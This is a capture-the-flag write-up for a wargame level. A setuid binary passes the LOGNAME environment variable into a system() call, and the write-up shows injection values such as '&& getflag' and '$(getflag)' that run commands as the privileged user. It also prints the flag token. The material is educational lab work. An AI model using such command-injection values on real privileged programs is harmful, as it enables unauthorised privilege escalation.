# LEVEL 07
In our home directory, we see an executable with suid/guid:
```
>$ ls -la
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```
Using strings command to return the string characters into the binary file:
```
>$ strings level07
[..]
[^_]
LOGNAME
/bin/echo %s
[..]
```
We retrieve the `.env` variable `'LOGNAME'` (which is an env variable that contains the user that executes the current shell process), with `asprintf` on the string `/bin/echo %s` to replace `%s` with the result of `LOGNAME`.

Let's check its value and what happens if we change it:
```
>$ echo $LOGNAME
level07
>$ export LOGNAME="hello"
>$ ./level07
hello
```
This is a vulnerability, since the file as suid bit and therefore will run any command as user flag07:
```
>$ export LOGNAME="&& whoami" /or/ LOGNAME=$\(whoami\)
>$ ./level07
flag07
```
So injecting getflag should yield the desired result:
```
>$ export LOGNAME="&& getflag" /or/ LOGNAME=$\(getflag\)
>$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
#### Vulnerability:
* System call by privileged user to echo env variable -> Privilege escalation via env variable.

#### Documentations:
1. https://unix.stackexchange.com/questions/268378/difference-between-logname-and-logname
1. http://codereview.stackexchange.com/questions/6435/c-system-function-vulnerability